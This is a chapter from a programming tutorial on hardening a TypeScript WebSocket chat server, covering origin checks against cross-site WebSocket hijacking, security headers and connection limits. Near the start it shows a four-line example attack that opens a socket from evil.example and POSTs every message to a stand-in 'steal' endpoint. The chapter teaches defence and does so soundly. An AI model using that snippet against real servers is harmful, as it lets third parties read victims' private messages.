# Chapter 24 - Security & Hardening

This server has had a serious vulnerability since Chapter 7. It has survived a chapter on authentication, a chapter on validation, and a chapter on the runtime, and none of them touched it - because it is not a bug in any of them. It is a thing the code never did.

## The Same-Origin Policy does not apply to WebSockets

Here is the attack. It is four lines, and the victim only has to **visit a page**.

```javascript
// on https://evil.example - a page the victim merely opens
const ws = new WebSocket("ws://your-chat-server:8080");
ws.onmessage = (e) => fetch("https://evil.example/steal", { method: "POST", body: e.data });
```

The browser opens that socket. Happily. **No preflight, no opt-in, no CORS.**

The Same-Origin Policy - the thing that stops `evil.example` reading the response from your bank - was written before WebSockets existed and **was never extended to them**. `fetch()` is blocked. `new WebSocket()` is not.

`wss.handleUpgrade()` has accepted this since Chapter 7 without a word.

## What saved us was luck

Our credential is a Bearer token that the client must send **deliberately**, inside a message. A drive-by socket from `evil.example` has no token, so it connects and then sits there being nobody.

That is an accident, not a design. Had we used a **cookie** - the obvious, natural, widely-taught thing to do - the browser would have attached it **automatically**, to that connection, from that page, and `evil.example` would be reading the victim's chat in real time.

Chapter 22 chose a Bearer token for exactly this reason and said so at the time. It bought us a defence in depth we never actually built. **Depending on a defence you did not build is not depth, it is a coincidence you have not noticed yet.**

## The fix is one line, and there is therefore no excuse

```typescript
if (!isOriginAllowed(outcome.request, this.originPolicy)) {
  this.logger.warn("refused a WebSocket upgrade from a disallowed origin", {
    client: conn.id,
    origin: outcome.request.headers.get("origin") ?? "(none)",
  });
  conn.write("HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
  conn.close();
  return;
}
```

`Origin` is the **only** defence a WebSocket has. The fact that the check is one line is not a reason to skip it; it is the reason there is no excuse for skipping it.

### Exact match, and only exact match

```typescript
return policy.allowed.includes(origin);
```

The classic bug is `origin.endsWith("example.com")`, which cheerfully accepts `https://evil-example.com`. The classic *other* bug is `origin.startsWith("https://example.com")`, which accepts `https://example.com.evil.net`.

**Substring checks on a security boundary are how this goes wrong, every single time.** The tests say so out loud:

```typescript
it.each([
  "https://chat.example.com.evil.net",   // beats startsWith
  "https://evil-chat.example.com",       // beats a careless endsWith
  "https://chat.example.com:9999",       // a different port is a different origin
  "http://chat.example.com",             // a different scheme is a different origin
  "null",                                 // a sandboxed iframe sends this
])("refuses %o", (origin) => {
  expect(isOriginAllowed(upgrade(origin), policy)).toBe(false);
});
```

### And a missing Origin is allowed

This looks like a hole and it is not:

```typescript
if (origin === undefined) {
  return policy.allowNonBrowser;
}
```

`nc`, `wscat`, a mobile app, a script - none of them send an `Origin`, and **none of them can be tricked into attaching somebody else's credentials.** The confused-deputy problem that `Origin` exists to solve is a *browser* problem: the browser is the deputy, and it is confused because it attaches credentials on the user's behalf without asking.

An attacker who can set arbitrary headers is not using a browser. And if they are not using a browser, they already have the victim's machine, and `Origin` was never going to save anybody.

> **Tip**
>
> `allowed: []` - refuse every browser - is the correct configuration for a server with no web UI, and it is worth knowing that it is *available*. Most origin checks in the wild are written as "allow my domain", when the truthful policy is often "allow nothing, because nothing should be opening this from a page."

## Headers that turn off things you did not ask for

```typescript
"Content-Security-Policy": [
  "default-src 'none'",
  "script-src 'unsafe-inline'",
  "connect-src 'self' ws: wss:",
  "frame-ancestors 'none'",
  "base-uri 'none'",
].join("; "),
"X-Frame-Options": "DENY",
"X-Content-Type-Options": "nosniff",
"Referrer-Policy": "no-referrer",
"Permissions-Policy": "camera=(), microphone=(), geolocation=(), payment=()",
```

None of these are magic. **Each one turns off a specific thing a browser would otherwise do on your behalf, and each one has a name because somebody was exploited by it first.**

- **CSP `default-src 'none'`** is the single most effective anti-XSS measure there is. Our page loads no external scripts, styles, fonts or images and never will, so say so - and then even if an attacker gets `<script src="//evil.example">` onto the page, the browser **refuses to fetch it**.
- **`X-Frame-Options: DENY`**: clickjacking is somebody rendering your UI invisibly over a "click for a free thing" button. The fix is to refuse to be rendered inside anything.
- **`nosniff`**: without it a browser *guesses* a response's type by sniffing its bytes, so a text file that happens to begin with `<script>` becomes a script.

And they go on **every** response, not just the HTML one - because a JSON error is still something a browser will render if you point it at one, and `nosniff` matters most precisely where an attacker would like the browser to guess.

> **Warning**
>
> `script-src 'unsafe-inline'` is in there, and it is a real weakening - it is what permits the inline `<script>` that *is* our client. Removing it means a nonce or a hash regenerated on every deploy, which is a real thing to do and is Chapter 25's problem.
>
> Leaving it **and knowing** is better than pretending. A security header you have copied from a blog post and do not understand is a comment, not a control.

## Bounding what one stranger can take

Chapter 15 bounded what a single connection could make the server *hold*. It said nothing about how many connections one person may open - and a bound on each of a million things is not a bound.

```typescript
const refusal = this.limits.refuse(address);
if (refusal !== undefined) {
  this.logger.warn("refused a connection", { address, reason: refusal });
  socket.destroy();
  return;
}
```

Refused **before** a `TcpClient` is constructed, before it is registered, before a buffer is allocated. The cheapest possible no.

And the small thing that matters:

```typescript
closed(address: string): void {
  const count = (this.perAddress.get(address) ?? 1) - 1;
  if (count <= 0) {
    this.perAddress.delete(address);   // not set(address, 0)
  }
}
```

A `Map` keyed by every IP that has ever connected is **a slow memory leak with a respectable job title.**

## The catalogue of what was already right

It is worth listing, because a security chapter that only finds new holes is a security chapter that has not been reading:

| | since |
|---|---|
| Passwords hashed with scrypt, per-user salt | Ch 17 |
| Constant-time comparison of signatures and hashes | Ch 17 |
| `alg:none` JWT forgery refused | Ch 17 |
| Account enumeration closed - same answer, same *timing* | Ch 17 |
| Authorization read from the account, never from the token | Ch 17 |
| SQL injection impossible: bound parameters everywhere | Ch 21 |
| Every message validated, every field bounded | Ch 14 |
| Unbounded read buffer closed | Ch 15 |
| Unbounded write queue closed | Ch 15 |
| Internal errors never leak to a client | Ch 10 |
| Secrets redacted from logs at the sink | Ch 20 |
| Bearer token, not a cookie - no CSRF | Ch 22 |
| Rate limiting | Ch 17 |

## And what is still wrong

An honest chapter says this part too.

1. **There is no TLS.** Everything above is defending a plaintext connection. `ws://` and `http://` mean every password, every token and every message crosses the network in the clear. In production this server sits behind nginx, Caddy, or a load balancer that terminates TLS - which is the normal and correct arrangement, and it means the *deployment* is where this gets fixed, not the code. Chapter 25.
2. **The timing side channel Chapter 19 admitted to.** Replace `timingSafeEqual` with `===` and all 111 tests still pass. That is still true.
3. **Tokens cannot be revoked.** A stolen token is valid until it expires. Chapter 17's exercise 4 asks you to fix it and points out that you will have reinvented a session table.
4. **`script-src 'unsafe-inline'`**, above.

## Putting It Together

`src/security.ts` shuts the origin hole that had been open since Chapter 7. It is on the `chapter24` branch.

The CSWSH defence, and the only defence a WebSocket has. Exact match, never a substring - the comment names the two classic bypasses:

```typescript
export function isOriginAllowed(request: HttpRequest, policy: OriginPolicy): boolean {
  const origin = request.headers.get("origin");

  if (origin === undefined) {
    return policy.allowNonBrowser;
  }

  // Exact match, and only exact match.
  //
  // The classic bug here is `origin.endsWith("example.com")`, which cheerfully
  // accepts `https://evil-example.com` and `https://example.com.evil.net`. The
  // classic *other* bug is `origin.startsWith("https://example.com")`, which
  // accepts `https://example.com.evil.net` too. Substring checks on a security
```

> **Tip**
>
> The complete, runnable file is `src/security.ts` on the `chapter24` branch. You are not meant to paste it wholesale - build your own as you follow along, and use the reference to check yourself.

## Try It

```bash
npm run build && npm start
curl -sD- -o /dev/null localhost:8080/ | grep -iE '^(content-security|x-frame|x-content)'
```

```
Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'; ...
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
```

The browser page still works, because the server allows the origin it serves that page from - it computes that for itself from `--host` and `--port`. And for anything else:

```bash
ALLOWED_ORIGINS=https://chat.example.com npm start
```

Then confirm the hole is shut, which is a job for the test suite rather than a script that looks like an exploit kit:

```bash
npx vitest run src/security.test.ts
```

```
 ✓ Cross-Site WebSocket Hijacking > refuses an upgrade from another website
 ✓ Cross-Site WebSocket Hijacking > refuses 'https://chat.example.com.evil.net'
 ✓ Cross-Site WebSocket Hijacking > refuses 'https://evil-chat.example.com'
 ✓ Cross-Site WebSocket Hijacking > allows a non-browser client with no Origin at all
```

## Exercise

1. Change the origin check to `origin.endsWith("example.com")`. Every test in `security.test.ts` that matters goes red, and it names the domain that just got in. Read it.
2. Set `allowedOrigins: []` and open the browser page. It breaks - and the error in the console is the *whole* lesson about what that header is for.
3. Remove `'unsafe-inline'` from the CSP. The page stops working. Now fix it properly: generate a nonce per response, put it on the `<script>` tag and in the header. What has to change about how the page is served?
4. Set `maxConnectionsPerAddress` to 1 and open two browser tabs. Now put the server behind a load balancer where every connection appears to come from one IP. What did you just do to all of your users, and what is the actual fix?
5. Find every place in this codebase where an attacker controls a string that ends up in a filename, a query, a header, or a log line. There are more than you think, and the ones that are safe are safe for a *reason*. Write the reason down.

## What's Next

The hole is shut, the headers are set, the connections are bounded, and the things that were already right have been counted.

What is left is everything between `npm run build` and a machine somebody else can reach: TLS, a container that does not run as root, a health check a load balancer can use, and a build that fails before a broken commit is ever deployed.

Next, and last: **packaging and deployment.**

---

Written for this repository. Upstream: <https://purphoros.com/howto/typescript/security>
